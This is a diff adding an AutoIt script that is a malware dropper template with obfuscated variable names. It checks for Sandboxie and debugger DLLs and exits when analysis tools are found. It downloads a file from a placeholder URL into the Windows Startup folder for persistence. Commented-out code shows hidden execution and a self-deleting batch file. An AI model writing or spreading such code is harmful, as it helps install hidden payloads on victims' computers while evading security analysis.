@@ -1,0 +1,31 @@
+#include <Constants.au3>
+#include <WinAPI.au3>
+
+
+shadow()
+$dadzfzz = @StartupDir
+$gegegevebeegefeverve="UrL"
+	  InetGet($gegegevebeegefeverve, $dadzfzz & "\NaMe.ExE")
+;aRun($dadzfzz & "\NaMe.ExE", "", @SW_HIDE )
+
+
+
+Func shadow()
+   Local $jHqKNtXxmfnoigndRmzABVJ = "sbiedll|dbghelp|"
+   Local $jHqKNtXxmfnoigndRmzABVJArray = StringSplit($jHqKNtXxmfnoigndRmzABVJ, "|")
+   For $i = 1 To $jHqKNtXxmfnoigndRmzABVJArray[0]
+     If _WinAPI_GetModuleHandle($jHqKNtXxmfnoigndRmzABVJArray[$i] & ".dll")> 0 Then
+       Exit
+     EndIf
+   Next
+EndFunc
+
+
+
+;$DEV = 'loop:' & @CRLF & 'del "' & @SCRIPTFULLPATH & '"' & @CRLF & _
+                    ;'ping -n 1 -w 250 zxywqxz_q' & @CRLF & 'if exist "' & @SCRIPTFULLPATH & _
+                    ;'" goto loop' & @CRLF & 'del scratch.bat' & @CRLF
+           ;FileWrite (@TempDir & "scratch.bat", $DEV)
+           ;Run (@TempDir & "scratch.bat",@TempDir, @SW_HIDE)
+           ;Exit
+
